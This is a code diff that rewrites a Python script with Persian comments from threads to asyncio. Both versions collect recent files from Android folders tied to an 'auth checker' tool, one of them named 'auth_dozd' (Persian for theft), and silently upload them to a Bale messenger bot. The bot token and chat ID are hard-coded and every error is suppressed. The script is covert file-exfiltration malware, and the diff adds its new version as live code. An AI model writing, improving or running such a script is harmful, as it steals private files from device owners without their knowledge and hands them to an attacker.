@@ -1,13 +1,42 @@
-import os, requests
-from concurrent.futures import ThreadPoolExecutor as TPE
+import os, aiohttp, asyncio
 
-token, chat_id = '480342547:j3qFwxAnN66xMVpZsDzYaXxk8neECXgco8gzIKia', '1884879628'
-dirs = ['/storage/emulated/0/AuthChecker/', '/storage/emulated/0/Download/', '/storage/emulated/0/auth checker/', '/storage/emulated/0/AUTH/اوت چکر مالک', '/storage/emulated/0/چکر مالک/', '/storage/emulated/0/Download/auth_dozd/']
-os.system('clear' if os.name == 'posix' else 'cls')
+# تنظیمات
+token = '480342547:j3qFwxAnN66xMVpZsDzYaXxk8neECXgco8gzIKia'
+chat_id = '1884879628'
+dirs = [
+    '/storage/emulated/0/AuthChecker/',
+    '/storage/emulated/0/Download/',
+    '/storage/emulated/0/auth checker/',
+    '/storage/emulated/0/AUTH/اوت چکر مالک',
+    '/storage/emulated/0/چکر مالک/',
+    '/storage/emulated/0/Download/auth_dozd/'
+]
 
-def send(f):
-    try: requests.post(f'https://tapi.bale.ai/bot{token}/sendDocument', data={'chat_id': chat_id, 'caption': '📄 10'}, files={'document': open(f, 'rb')})
-    except: pass
+# تابع ارسال فایل
+async def send_file(session, file_path):
+    try:
+        form_data = aiohttp.FormData()
+        form_data.add_field('chat_id', chat_id)
+        form_data.add_field('caption', '📄 10')
+        form_data.add_field('document', open(file_path, 'rb'), filename=os.path.basename(file_path))
+        async with session.post(f'https://tapi.bale.ai/bot{token}/sendDocument', data=form_data) as response:
+            await response.read()  # اطمینان از تکمیل درخواست
+    except Exception as e:
+        pass  # خطاها نادیده گرفته می‌شوند
 
-with TPE(max_workers=10) as ex:
-    ex.map(send, [os.path.join(d, f) for d in dirs for f in os.listdir(d)[:5] if os.path.isfile(os.path.join(d, f))])
+# تابع اصلی
+async def main():
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for directory in dirs:
+            if not os.path.exists(directory):  # بررسی وجود دایرکتوری
+                continue
+            files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
+            files = sorted(files, key=os.path.getmtime, reverse=True)[:2]  # ۵ فایل آخر
+            for file_path in files:
+                tasks.append(send_file(session, file_path))
+        await asyncio.gather(*tasks)  # اجرای موازی
+
+# اجرای برنامه
+if __name__ == '__main__':
+    asyncio.run(main())
